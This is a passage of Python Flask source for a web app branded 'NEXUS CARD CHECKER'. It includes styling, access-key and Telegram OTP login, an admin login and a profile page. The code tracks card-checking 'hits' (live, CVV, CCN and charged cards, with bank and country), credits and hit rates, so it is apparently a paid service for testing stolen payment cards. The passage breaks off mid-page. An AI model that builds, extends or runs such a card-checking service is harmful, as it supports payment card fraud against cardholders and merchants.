.gwsel:hover{{background:rgba(255,255,255,.06)}}
.gwsel .arr{{font-size:10px;transition:transform .15s}}
.gwsel.open .arr{{transform:rotate(180deg)}}
.gwlist{{display:none;margin-top:4px;max-height:300px;overflow-y:auto}}
.gwlist.open{{display:block}}
.gwsel{{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.1);border-radius:6px;cursor:pointer;font-size:12px;font-weight:700;color:#fff;letter-spacing:.5px;transition:all .1s;text-transform:uppercase}}
.gwsel:hover{{background:rgba(255,255,255,.06)}}
.gwsel .arr{{font-size:10px;transition:transform .15s}}
.gwsel.open .arr{{transform:rotate(180deg)}}
.gwlist{{display:none;margin-top:4px;max-height:300px;overflow-y:auto}}
.gwlist.open{{display:block}}
.chargebtn{{border-left:2px solid rgba(34,197,94,.3)!important}}
.authbtn{{border-left:2px solid rgba(96,165,250,.3)!important}}
.gwdrawer{{display:flex;align-items:flex-start;gap:4px;margin-top:10px;position:relative;overflow:visible}}
.gwcat{{flex-shrink:0}}
.gwcat-btn{{padding:4px 8px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:4px;cursor:pointer;font-size:9px;font-weight:700;color:rgba(255,255,255,.35);letter-spacing:.8px;transition:all .1s;white-space:nowrap}}
.gwcat-btn:hover{{background:rgba(255,255,255,.06);color:#fff}}
.gwcat.open .gwcat-btn{{background:rgba(255,255,255,.06);color:#fff;border-color:rgba(255,255,255,.12)}}
.gwcat-row{{display:none;position:fixed;left:auto;top:auto;margin-top:4px;z-index:999;flex-wrap:wrap;gap:3px;max-width:calc(100vw-20px);background:rgba(12,8,8,.98);border:1px solid rgba(255,255,255,.1);border-radius:6px;padding:6px;box-shadow:0 8px 24px rgba(0,0,0,.6)}}
.gwcat.open .gwcat-row{{display:flex}}
.gwcat-row .gwbtn{{padding:4px 8px!important;font-size:9px!important;font-weight:600!important;background:rgba(12,8,8,.97)!important;border:1px solid rgba(255,255,255,.08)!important;border-radius:4px!important;color:rgba(255,255,255,.45)!important;text-transform:none!important;letter-spacing:0!important;white-space:nowrap!important}}
.gwcat-row .gwbtn:hover{{color:#fff!important;border-color:rgba(255,255,255,.2)!important}}
.gwcat-row .gwbtn.act{{background:rgba(220,38,38,.2)!important;color:#fff!important;border-color:rgba(239,68,68,.4)!important}}
.gwactive{{font-size:10px;font-weight:700;color:rgba(255,255,255,.5);letter-spacing:.5px;display:none;white-space:nowrap;padding:4px 0}}
.gwactive.show{{display:block}}
.gwsel-drop .gwbtn:hover{{background:rgba(255,255,255,.06)!important;color:#fff!important}}
.gwsel-drop .gwbtn.act{{background:rgba(220,38,38,.15)!important;color:#fff!important}}
.gwsel-drop .gwdivider{{height:1px;background:rgba(255,255,255,.05);margin:2px 0}}
.gwactive{{font-size:11px;font-weight:700;color:rgba(255,255,255,.6);letter-spacing:.5px;display:none}}
.gwactive.show{{display:block}}
.modal{{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center}}
.modal.show{{display:flex}}
.modal .mc{{background:rgba(25,15,15,.95);border:1px solid rgba(255,255,255,.12);border-radius:12px;padding:24px;max-width:700px;width:95%;max-height:80vh;display:flex;flex-direction:column;box-shadow:0 0 40px rgba(0,0,0,.6)}}
.modal .mh{{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;border-bottom:1px solid rgba(255,255,255,.06);padding-bottom:12px}}
.modal .mh h3{{font-size:14px;color:#fff;margin:0;letter-spacing:1px}}
.modal .mb{{overflow-y:auto;flex:1;max-height:60vh;font-family:monospace;font-size:12px}}
.modal .hitr{{display:flex;gap:10px;align-items:center;padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.03);color:rgba(255,255,255,.8)}}
.modal .hitr .s{{font-weight:700;min-width:60px;font-size:11px}}
.modal .hitr .g{{color:rgba(255,255,255,.35);font-size:10px;min-width:80px}}
.modal .hitr .t{{color:rgba(255,255,255,.25);font-size:10px;min-width:60px}}
.modal .mbtns{{display:flex;gap:8px;margin-top:14px}}
.histbtn{{width:32px;height:32px;border:none;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .2s;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);flex-shrink:0}}
.histbtn:hover{{background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.2)}}
.histbtn svg{{stroke:rgba(255,255,255,.4);transition:stroke .2s}}
.histbtn:hover svg{{stroke:#fff}}
.actbar{{display:flex;gap:6px;margin-top:10px;align-items:center}}
.actbar .btn{{height:32px!important;padding:0 12px!important;display:flex!important;align-items:center!important;justify-content:center!important;border-radius:6px!important;font-size:10px!important;flex-shrink:0;letter-spacing:0.5px!important}}
.throw{{display:flex;align-items:center;gap:10px;margin-top:10px;padding:7px 10px;border:1px solid rgba(255,255,255,.08);border-radius:8px;background:rgba(0,0,0,.18)}}
.thk{{font-size:11px;color:rgba(255,255,255,.5);font-weight:700;letter-spacing:1.4px;text-transform:uppercase;min-width:58px}}
.thv{{font-size:12px;color:#22c55e;font-weight:700;min-width:44px;text-align:right}}
.thrange{{-webkit-appearance:none;appearance:none;flex:1;height:6px;border-radius:8px;background:rgba(255,255,255,.22);outline:none;border:none;padding:0}}
.thrange::-webkit-slider-thumb{{-webkit-appearance:none;appearance:none;width:22px;height:22px;border-radius:50%;background:#a3e635;border:2px solid rgba(20,20,20,.9);box-shadow:0 0 0 1px rgba(255,255,255,.12),0 3px 10px rgba(163,230,53,.25);cursor:pointer}}
.thrange::-moz-range-thumb{{width:22px;height:22px;border-radius:50%;background:#a3e635;border:2px solid rgba(20,20,20,.9);box-shadow:0 0 0 1px rgba(255,255,255,.12),0 3px 10px rgba(163,230,53,.25);cursor:pointer}}
.hitrow{{background:rgba(34,197,94,.04);border:1px solid rgba(34,197,94,.1);border-left:3px solid #22c55e;border-radius:2px 6px 6px 2px;padding:10px 14px;margin-bottom:8px;transition:all .2s}}
.hitrow:hover{{background:rgba(34,197,94,.07);border-color:rgba(34,197,94,.2)}}
.htag{{background:rgba(34,197,94,.15);color:#22c55e;font-size:10px;font-weight:800;padding:3px 8px;border-radius:3px;letter-spacing:1px}}
.htip{{font-size:11px;color:rgba(255,255,255,.7);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);padding:3px 10px;border-radius:4px;font-weight:500}}
@keyframes slideIn{{from{{opacity:0;transform:translateX(-6px)}}to{{opacity:1;transform:translateX(0)}}}}
@keyframes fadeUp{{from{{opacity:0;transform:translateY(14px)}}to{{opacity:1;transform:translateY(0)}}}}
@keyframes fi{{from{{opacity:0;transform:translateY(-4px)}}to{{opacity:1;transform:translateY(0)}}}}
@keyframes woodDrift{{from{{transform:translate3d(0,0,0) scale(1)}}to{{transform:translate3d(0,-10px,0) scale(1.02)}}}}
@keyframes grainShift{{from{{background-position:0 0}}to{{background-position:280px 160px}}}}
@keyframes hdrSweep{{0%,14%{{transform:translateX(0)}}50%,100%{{transform:translateX(420%)}}}}
@keyframes panelIn{{from{{opacity:0;transform:translateY(9px) scale(.992)}}to{{opacity:1;transform:translateY(0) scale(1)}}}}
@keyframes statIn{{from{{opacity:0;transform:translateY(10px)}}to{{opacity:1;transform:translateY(0)}}}}
@keyframes numPop{{0%{{transform:scale(1)}}30%{{transform:scale(1.08)}}100%{{transform:scale(1)}}}}
@keyframes barFlow{{from{{background-position:0 0}}to{{background-position:220% 0}}}}
@keyframes gwIn{{from{{opacity:0;transform:translateY(6px)}}to{{opacity:1;transform:translateY(0)}}}}
@keyframes gwSweep{{from{{transform:translateX(-120%)}}to{{transform:translateX(120%)}}}}
@keyframes gwPulse{{0%,100%{{box-shadow:0 0 0 1px rgba(239,152,87,.28),0 6px 14px rgba(148,64,40,.2)}}50%{{box-shadow:0 0 0 1px rgba(255,184,120,.52),0 10px 20px rgba(148,64,40,.32)}}}}
@keyframes gwDot{{0%{{box-shadow:0 0 0 0 rgba(244,177,90,.45)}}70%{{box-shadow:0 0 0 8px rgba(244,177,90,0)}}100%{{box-shadow:0 0 0 0 rgba(244,177,90,0)}}}}
@keyframes statusPop{{0%{{transform:scale(1)}}50%{{transform:scale(1.09)}}100%{{transform:scale(1)}}}}
@keyframes declineIn{{from{{opacity:.65;transform:translateX(-4px)}}to{{opacity:1;transform:translateX(0)}}}}
@media(max-width:600px){{.st{{grid-template-columns:repeat(2,1fr)}}.hit .d{{flex-direction:column}}}}
@media(prefers-reduced-motion:reduce){{*{{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important;scroll-behavior:auto!important}}}}
::-webkit-scrollbar{{width:6px;height:6px}}::-webkit-scrollbar-track{{background:rgba(255,255,255,.03);border-radius:3px}}::-webkit-scrollbar-thumb{{background:rgba(255,255,255,.12);border-radius:3px}}::-webkit-scrollbar-thumb:hover{{background:rgba(255,255,255,.2)}}
.lbg{{position:fixed;inset:0;overflow:hidden;pointer-events:none;z-index:0}}
.lbg-orb{{position:absolute;border-radius:50%;filter:blur(80px);opacity:.18}}
.lbg-orb1{{width:500px;height:500px;background:radial-gradient(circle,#c41e1e,transparent);top:-120px;left:-100px;animation:orbFloat1 12s ease-in-out infinite}}
.lbg-orb2{{width:400px;height:400px;background:radial-gradient(circle,#7c1010,transparent);bottom:-100px;right:-80px;animation:orbFloat2 15s ease-in-out infinite}}
@keyframes orbFloat1{{0%,100%{{transform:translate(0,0)}}50%{{transform:translate(40px,30px)}}}}
@keyframes orbFloat2{{0%,100%{{transform:translate(0,0)}}50%{{transform:translate(-30px,-20px)}}}}
.lw{{display:flex;justify-content:center;align-items:center;min-height:100vh;position:relative;z-index:1}}
.lc{{width:100%;max-width:400px;background:rgba(18,10,10,.92);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:44px 32px 36px;text-align:center;box-shadow:0 0 0 1px rgba(196,30,30,.08),0 24px 60px rgba(0,0,0,.7);backdrop-filter:blur(12px)}}
.llogo{{position:relative;display:inline-flex;align-items:center;justify-content:center;width:72px;height:72px;margin-bottom:18px}}
.llogo-ring{{position:absolute;inset:0;border-radius:50%;border:2px solid rgba(196,30,30,.4);animation:ringPulse 2.4s ease-in-out infinite}}
.llogo-ring::after{{content:"";position:absolute;inset:-6px;border-radius:50%;border:1px solid rgba(196,30,30,.15)}}
.llogo-icon{{font-size:32px;position:relative;z-index:1;filter:drop-shadow(0 0 10px rgba(220,50,50,.5))}}
@keyframes ringPulse{{0%,100%{{box-shadow:0 0 0 0 rgba(196,30,30,.3),inset 0 0 20px rgba(196,30,30,.08)}}50%{{box-shadow:0 0 0 8px rgba(196,30,30,0),inset 0 0 30px rgba(196,30,30,.12)}}}}
.lbrand{{font-size:32px;font-weight:900;letter-spacing:8px;color:#fff;text-shadow:0 0 30px rgba(196,30,30,.5);margin-bottom:4px}}
.lsub{{font-size:10px;font-weight:700;letter-spacing:4px;color:rgba(255,255,255,.3);text-transform:uppercase;margin-bottom:0}}
.ldivider{{height:1px;background:linear-gradient(90deg,transparent,rgba(196,30,30,.3),transparent);margin:22px 0 20px}}
.lig{{text-align:left;margin-bottom:14px}}
.llabel{{display:block;font-size:10px;font-weight:700;color:rgba(255,255,255,.3);letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}}
.linput{{width:100%;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);color:#fff;padding:12px 14px;border-radius:8px;font-size:14px;outline:none;transition:all .2s;font-family:monospace}}
.linput:focus{{border-color:rgba(196,30,30,.5);background:rgba(196,30,30,.04);box-shadow:0 0 0 3px rgba(196,30,30,.08)}}
.linput::placeholder{{color:rgba(255,255,255,.2)}}
.otpinput{{text-align:center;font-size:22px;letter-spacing:10px;font-weight:700}}
.lbtn{{width:100%;margin-top:6px;padding:13px;background:linear-gradient(135deg,#b91c1c,#c41e1e,#dc2626);color:#fff;border:none;border-radius:8px;font-size:12px;font-weight:800;letter-spacing:2px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 20px rgba(196,30,30,.3)}}
.lbtn:hover{{background:linear-gradient(135deg,#c41e1e,#dc2626,#ef4444);box-shadow:0 6px 28px rgba(196,30,30,.45);transform:translateY(-1px)}}
.lbtn:active{{transform:scale(.97)}}
.lbtn:disabled{{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}}
.lbtn-arr{{font-size:16px;transition:transform .2s}}.lbtn:hover .lbtn-arr{{transform:translateX(4px)}}
.lhint{{margin-top:18px;font-size:11px;color:rgba(255,255,255,.25)}}
.llink{{color:rgba(196,30,30,.8);text-decoration:none;font-weight:700}}.llink:hover{{color:#ef4444}}
.pf-card{{background:linear-gradient(135deg,rgba(196,30,30,.12),rgba(30,20,20,.8));border:1px solid rgba(196,30,30,.2);border-radius:14px;padding:20px 22px;margin-bottom:14px;display:flex;align-items:center;gap:18px;box-shadow:0 4px 20px rgba(0,0,0,.3)}}
.pf-avatar{{width:58px;height:58px;border-radius:50%;background:linear-gradient(135deg,#7c1010,#c41e1e);display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:900;color:#fff;flex-shrink:0;box-shadow:0 0 0 3px rgba(196,30,30,.2),0 4px 14px rgba(196,30,30,.3)}}
.pf-info{{flex:1;min-width:0}}
.pf-name{{font-size:18px;font-weight:800;color:#fff;margin-bottom:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}}
.pf-meta{{display:flex;gap:8px;flex-wrap:wrap}}
.pf-tag{{display:inline-flex;align-items:center;gap:4px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:3px 10px;font-size:11px;font-weight:600;color:rgba(255,255,255,.7)}}
.pf-tag-dim{{color:rgba(255,255,255,.3);border-color:rgba(255,255,255,.06)}}
.pf-stat-box{{display:flex;flex-direction:column;align-items:center;gap:6px}}
.pf-stat-icon{{width:36px;height:36px;border-radius:10px;border:1px solid rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:16px;margin-bottom:2px}}
.pf-hits-card{{padding:0!important;overflow:hidden}}
.pf-hits-hdr{{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid rgba(255,255,255,.05)}}
.pf-hits-label{{font-size:12px;font-weight:800;letter-spacing:1px;text-transform:uppercase}}
.pf-hits-count{{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);border-radius:20px;font-size:11px;font-weight:700;padding:2px 9px;color:rgba(255,255,255,.7)}}
.pf-copy-btn{{padding:4px 12px!important;font-size:10px!important;letter-spacing:1px!important;height:26px!important}}
.pf-empty{{color:rgba(255,255,255,.25);font-size:12px;padding:20px 16px;text-align:center;font-style:italic}}
.stat-live .n{{color:#22c55e!important}}.st>div.stat-live{{border-color:rgba(34,197,94,.3)!important;background:rgba(34,197,94,.06)!important}}
.stat-ccn .n{{color:#60a5fa!important}}.st>div.stat-ccn{{border-color:rgba(96,165,250,.25)!important;background:rgba(96,165,250,.05)!important}}
.stat-chg .n{{color:#f59e0b!important}}.st>div.stat-chg{{border-color:rgba(245,158,11,.25)!important;background:rgba(245,158,11,.05)!important}}
.stat-dead .n{{color:#ef4444!important}}
.ck-con-hdr{{display:flex;align-items:center;gap:6px;padding:9px 14px;border-bottom:1px solid rgba(255,255,255,.05);background:rgba(0,0,0,.25)}}
.ck-con-dot{{width:9px;height:9px;border-radius:50%;flex-shrink:0}}
.ck-con-title{{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,.28);flex:1;text-align:center}}
.ck-inp-hdr{{display:flex;align-items:center;gap:8px;padding:11px 16px;border-bottom:1px solid rgba(255,255,255,.05);background:rgba(0,0,0,.2)}}
.ck-inp-dots{{display:flex;gap:5px}}
.ck-inp-dot{{width:10px;height:10px;border-radius:50%}}
.ck-inp-label{{font-size:10px;font-weight:700;letter-spacing:1.8px;color:rgba(255,255,255,.32);text-transform:uppercase;flex:1;text-align:center}}
.ck-hit-panel{{padding:0!important;overflow:hidden}}
.ck-hit-hdr{{display:flex;align-items:center;justify-content:space-between;padding:11px 16px;border-bottom:1px solid rgba(255,255,255,.05)}}
.ck-hit-badge{{display:flex;align-items:center;gap:8px}}
.ck-hit-glow{{width:8px;height:8px;border-radius:50%;flex-shrink:0}}
.ck-hit-label{{font-size:11px;font-weight:900;letter-spacing:2px;text-transform:uppercase}}
.ck-brand-wrap{{display:flex;align-items:center;gap:10px}}
.ck-divider{{width:1px;height:16px;background:rgba(255,255,255,.1)}}
@keyframes glowPulse{{0%,100%{{opacity:1}}50%{{opacity:.4}}}}'''

def base(b):return f'<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>NEXUS</title><script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script><style>{CSS}</style></head><body>{b}</body></html>'

# â”€â”€ Routes â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
@app.route("/",methods=["GET","POST"])
def index_or_key():
    if session.get("admin") or session.get("key") or session.get("tuid"):
        d=load_data()
        if session.get("admin"):return redirect("/checker")
        tuid=session.get("tuid")
        if tuid:
            usr=d.get("users",{}).get(tuid,{})
            if usr.get("active_session") and usr.get("active_session")==session.get("_ks",""):return redirect("/checker")
        ki=d["keys"].get(session.get("key"))
        if ki and ki.get("used") and ki.get("used_time",0)<ki.get("duration",0):
            if ki.get("active_session") and ki.get("active_session")==session.get("_ks",""):
                return redirect("/checker")
        session.clear()
    err=""
    if request.method=="POST":
        k=request.form.get("key","").upper().strip();d=load_data();ki=d["keys"].get(k)
        if not ki:err="Invalid key"
        elif ki.get("used"):
            used=ki.get("used_time",0);dur=ki.get("duration",0)
            if used>=dur:err="Key expired"
            elif ki.get("active_session") and ki.get("active_session")!=session.get("_ks",""):err="Key in use"
            else:
                tok=uuid.uuid4().hex;ki["active_session"]=tok;session["_ks"]=tok;save_data(d)
                session["key"]=k;return redirect("/checker")
        else:
            tok=uuid.uuid4().hex;ki["used"]=True;ki["activated"]=time.time();ki["used_time"]=0;ki["active_session"]=tok;session["_ks"]=tok;save_data(d)
            session["key"]=k;return redirect("/checker")
    err_div=f'<div class="err">{err}</div>' if err else ""
    return base(f'''
<div class="lw">
<div class="lbg"><div class="lbg-orb lbg-orb1"></div><div class="lbg-orb lbg-orb2"></div></div>
<div class="lc">
  <div class="llogo">
    <div class="llogo-ring"></div>
    <div class="llogo-icon">&#9889;</div>
  </div>
  <div class="lbrand">NEXUS</div>
  <div class="lsub">CARD CHECKER</div>
  <div class="ldivider"></div>
  {err_div}
  <div class="lig"><label class="llabel">TELEGRAM ID</label><input id=_tgid placeholder="e.g. 6812535526" class="linput" autocomplete="off"></div>
  <div id=_otprow class="lig" style="display:none">
    <label class="llabel">OTP CODE</label>
    <input id=_otp placeholder="000000" maxlength=6 class="linput otpinput" autocomplete="off">
  </div>
  <button class="lbtn" id=_otpbtn onclick="_otpSend()">
    <span id=_otpbtn_txt>SEND OTP</span>
    <span class="lbtn-arr">&#8594;</span>
  </button>
  <div class="lhint">Start <a href="https://t.me/nexusccorbot" target="_blank" class="llink">@nexusccorbot</a> on Telegram first</div>
</div>
</div>
<script>
var _otpState=0;
function _otpSend(){{
var btn=document.getElementById("_otpbtn");
var txt=document.getElementById("_otpbtn_txt");
var uid=document.getElementById("_tgid").value.trim();
if(!uid||!/^\\d+$/.test(uid)){{alert("Enter your Telegram ID");return}}
if(_otpState===0){{
txt.textContent="SENDING...";btn.disabled=true;
fetch("/bot/send-otp",{{method:"POST",headers:{{"Content-Type":"application/x-www-form-urlencoded"}},body:"uid="+encodeURIComponent(uid)}}).then(function(r){{return r.json()}}).then(function(j){{
if(j.ok){{_otpState=1;txt.textContent="VERIFY OTP";btn.disabled=false;document.getElementById("_otprow").style.display="block";document.getElementById("_otp").focus()}}
else{{txt.textContent="SEND OTP";btn.disabled=false;alert(j.error)}}
}});
}}else{{
var code=document.getElementById("_otp").value.trim();
if(!code||code.length!==6){{alert("Enter 6-digit OTP");return}}
txt.textContent="VERIFYING...";btn.disabled=true;
fetch("/bot/verify-otp",{{method:"POST",headers:{{"Content-Type":"application/x-www-form-urlencoded"}},body:"uid="+encodeURIComponent(uid)+"&code="+encodeURIComponent(code)}}).then(function(r){{return r.json()}}).then(function(j){{
if(j.ok)window.location=j.redirect;
else{{txt.textContent="VERIFY OTP";btn.disabled=false;alert(j.error)}}
}});
}}
}}
</script>''')

@app.route("/expired")
def expired():
    session.clear()
    return base('<div class="lw"><div class="lc"><h1 style="color:#e74c3c">EXPIRED</h1><p>Your key has expired</p><a href="/" class="btn bg" style="display:inline-block;margin-top:16px;text-decoration:none">Enter New Key</a></div></div>')

@app.route("/logout")
def logout():
    k=session.get("key")
    if k:
        d=load_data();ki=d["keys"].get(k)
        if ki:ki.pop("active_session",None);save_data(d)
    tuid=session.get("tuid")
    if tuid:
        d=load_data()
        if tuid in d.get("users",{}):d["users"][tuid].pop("active_session",None);save_data(d)
    session.clear();return redirect("/")

@app.route("/tg/callback")
def tg_callback():
    raw_qs=request.query_string.decode()
    print(f"[TG] raw_qs: {raw_qs[:300]}",flush=True)
    from urllib.parse import parse_qs
    d={k:v[0] for k,v in parse_qs(raw_qs).items()}
    check_hash=d.pop("hash","")
    data_check_string="\n".join(f"{k}={v}" for k,v in sorted(d.items()))
    secret_key=hashlib.sha256(TG_BOT_TOKEN.encode()).digest()
    calc_hash=hmac.new(secret_key,data_check_string.encode(),hashlib.sha256).hexdigest()
    print(f"[TG] recv: {check_hash} calc: {calc_hash} data: {data_check_string.replace(chr(10),'|')}",flush=True)
    if calc_hash!=check_hash:
        return base('<div class="lw"><div class="lc"><p style="color:#ef4444">Invalid auth</p><a href="/" class="btn bg" style="display:inline-block;margin-top:12px;text-decoration:none">Back</a></div></div>')
        return base('<div class="lw"><div class="lc"><p style="color:#ef4444">Invalid auth</p><a href="/" class="btn bg" style="display:inline-block;margin-top:12px;text-decoration:none">Back</a></div></div>')
    tuid=str(d.get("id",""))
    tuname=d.get("username","user_"+tuid[:8])
    tfirst=d.get("first_name","User")
    db=load_data()
    db.setdefault("users",{})
    if tuid not in db["users"]:
        db["users"][tuid]={"username":tuname,"first_name":tfirst,"credits":20,"used_credits":0,"duration":99999999,"used_time":0,"used":True,"created":time.time()}
    save_data(db)
    session["tuid"]=tuid;session["tuname"]=tuname
    tok=uuid.uuid4().hex
    db["users"][tuid]["active_session"]=tok;session["_ks"]=tok;save_data(db)
    return redirect("/checker")

@app.route("/admin/login",methods=["GET","POST"])
def admin_login():
    err=""
    if request.method=="POST":
        u=request.form.get("username","");p=request.form.get("password","")
        if u==ADMIN_USER and p==ADMIN_PASS:session["admin"]=True;return redirect("/admin")
        err="Invalid credentials"
    return base(f'<div class="lw"><div class="lc"><p>Admin Login</p>{"<div class=err>"+err+"</div>"if err else""}<form method=POST><div class=ig><label>Username</label><input name=username required autofocus></div><div class=ig><label>Password</label><input name=password type=password required></div><button class="btn bg" style="width:100%;margin-top:8px">Login</button></form></div></div>')

@app.route("/profile")
@login_required
def profile():
    d=load_data();hits=d.get("hits",[]);s=d["stats"]
    if session.get("admin"):
        tleft="Unlimited";total_chk=s["checked"];total_cvv=s.get("cvv",0);total_ccn=s.get("ccn",0);total_dead=s["dead"]
        my_hits=hits
    elif session.get("tuid"):
        tuid=session["tuid"];usr=d.get("users",{}).get(tuid,{})
        cr=usr.get("credits",0);uc=usr.get("used_credits",0);rem_cr=max(cr-uc,0)
        tleft=f'<span style="color:#f59e0b">{rem_cr}</span>'
        my_hits=[h for h in hits if h.get("key")==tuid]
        total_cvv=sum(1 for h in my_hits if h["status"] in("CVV","LIVE","CHARGED","3DS"))
        total_ccn=sum(1 for h in my_hits if h["status"]=="CCN")
        total_chk=len(my_hits)
        total_dead=sum(1 for h in my_hits if h["status"] not in("CVV","LIVE","CCN","CHARGED","3DS"))
    else:
        ki=d["keys"].get(session.get("key",""),{});used=ki.get("used_time",0);dur=ki.get("duration",0)
        rem=max(int(dur-used),0);rh,rr=divmod(rem,3600);rm,rs=divmod(rr,60)
        tleft=f"{rh}:{rm:02d}:{rs:02d}";ukey=session.get("key","")
        my_hits=[h for h in hits if h.get("key")==ukey]
        total_cvv=sum(1 for h in my_hits if h["status"] in("CVV","LIVE","CHARGED","3DS"))
        total_ccn=sum(1 for h in my_hits if h["status"]=="CCN")
        total_chk=len(my_hits)
        total_dead=sum(1 for h in my_hits if h["status"] not in("CVV","LIVE","CCN","CHARGED","3DS"))
    charged_hits=[h for h in my_hits if h["status"]=="CHARGED"]
    live_hits=[h for h in my_hits if h["status"] in ("CVV","LIVE","3DS")]
    ccn_hits=[h for h in my_hits if h["status"]=="CCN"]
    def hit_row(h):
        ts=time.strftime("%m/%d %H:%M",time.localtime(h.get("time",0)))
        g=h.get("gate",h.get("key","?")[:8])
        return f'<div class="r rv" data-cc="{h["cc"]}" data-info="{h.get("brand","?")} {h.get("bank","?")} {h.get("country","?")}"><span class="t tl">LIVE</span><span>{h["cc"]}</span><span class="i">{h.get("brand","?")} | {h.get("bank","?")} | {h.get("country","?")} | {g} | {ts}</span></div>'
    def ch_row(h):
        ts=time.strftime("%m/%d %H:%M",time.localtime(h.get("time",0)))
        g=h.get("gate",h.get("key","?")[:8])
        return f'<div class="r rv" style="border-left:3px solid #f59e0b" data-cc="{h["cc"]}" data-info="{h.get("brand","?")} {h.get("bank","?")} {h.get("country","?")}"><span class="t" style="color:#f59e0b;font-weight:700">CHARGED</span><span>{h["cc"]}</span><span class="i">{h.get("brand","?")} | {h.get("bank","?")} | {h.get("country","?")} | {g} | {ts}</span></div>'
    def ccn_row(h):
        ts=time.strftime("%m/%d %H:%M",time.localtime(h.get("time",0)))
        g=h.get("gate",h.get("key","?")[:8])
        return f'<div class="r rn" data-cc="{h["cc"]}" data-info="{h.get("brand","?")} {h.get("bank","?")} {h.get("country","?")}"><span class="t tn">CCN</span><span>{h["cc"]}</span><span class="i">{h.get("brand","?")} | {h.get("bank","?")} | {h.get("country","?")} | {g} | {ts}</span></div>'
    ch_rows="".join(ch_row(h) for h in reversed(charged_hits))or'<div class="pf-empty">No charged hits yet</div>'
    cv_rows="".join(hit_row(h) for h in reversed(live_hits))or'<div class="pf-empty">No live hits yet</div>'
    cn_rows="".join(ccn_row(h) for h in reversed(ccn_hits))or'<div class="pf-empty">No CCN hits yet</div>'
    hit_rate=round((total_cvv+total_ccn)/total_chk*100,1) if total_chk>0 else 0
    if session.get("admin"):
        uname="Admin";ufirst="Administrator";uid_disp="—"
    elif session.get("tuid"):
        tuid=session["tuid"];usr2=d.get("users",{}).get(tuid,{})
        uname=usr2.get("username","?");ufirst=usr2.get("first_name","User");uid_disp=tuid
    else:
        uname=session.get("key","?")[:8];ufirst="Key User";uid_disp="—"
    avatar_letter=(ufirst[0] if ufirst else "U").upper()
    return base(f'''<div class="wrap">
<div class="hdr">
  <a href=/checker class="btn hbtn" style="display:flex;align-items:center;gap:6px">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M5 12l7 7M5 12l7-7"/></svg>BACK
  </a>
  <div style="font-size:13px;color:rgba(255,255,255,.5);font-weight:700;letter-spacing:1px">PROFILE</div>
  <a href=/logout class="btn hbtn" style="color:#ef4444!important;border-color:rgba(239,68,68,.25)!important;font-size:10px!important">LOGOUT</a>
</div>
<div class="pf-card">
  <div class="pf-avatar">{avatar_letter}</div>
  <div class="pf-info">
    <div class="pf-name">{ufirst}</div>
    <div class="pf-meta">
      <span class="pf-tag">
        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.29 9.18 19.79 19.79 0 01.22 4 2 2 0 012.2 2h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.91 9.91a16 16 0 006.29 6.29l1.45-1.45a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
        @{uname}
      </span>
      <span class="pf-tag pf-tag-dim">ID: {uid_disp}</span>
    </div>
  </div>
</div>
<div class="st" style="grid-template-columns:repeat(4,1fr)">
  <div class="pf-stat-box">
    <div class="pf-stat-icon" style="background:rgba(196,30,30,.15);border-color:rgba(196,30,30,.3)">&#128179;</div>
    <div class="n" style="font-size:22px">{tleft}</div>
    <div class="l">Credits</div>
  </div>
  <div class="pf-stat-box">
    <div class="pf-stat-icon" style="background:rgba(34,197,94,.1);border-color:rgba(34,197,94,.25)">&#9989;</div>
    <div class="n ng" style="font-size:22px">{total_cvv+total_ccn}</div>
    <div class="l">Total Hits</div>
  </div>
  <div class="pf-stat-box">
    <div class="pf-stat-icon" style="background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.12)">&#128203;</div>
    <div class="n" style="font-size:22px">{total_chk}</div>
    <div class="l">Checked</div>
  </div>
  <div class="pf-stat-box">
    <div class="pf-stat-icon" style="background:rgba(245,158,11,.1);border-color:rgba(245,158,11,.25)">&#128200;</div>
    <div class="n" style="font-size:22px;color:#f59e0b">{hit_rate}%</div>
    <div class="l">Hit Rate</div>
  </div>
</div>
<div class="cd" style="padding:10px 14px">
  <div style="display:flex;align-items:center;gap:8px">
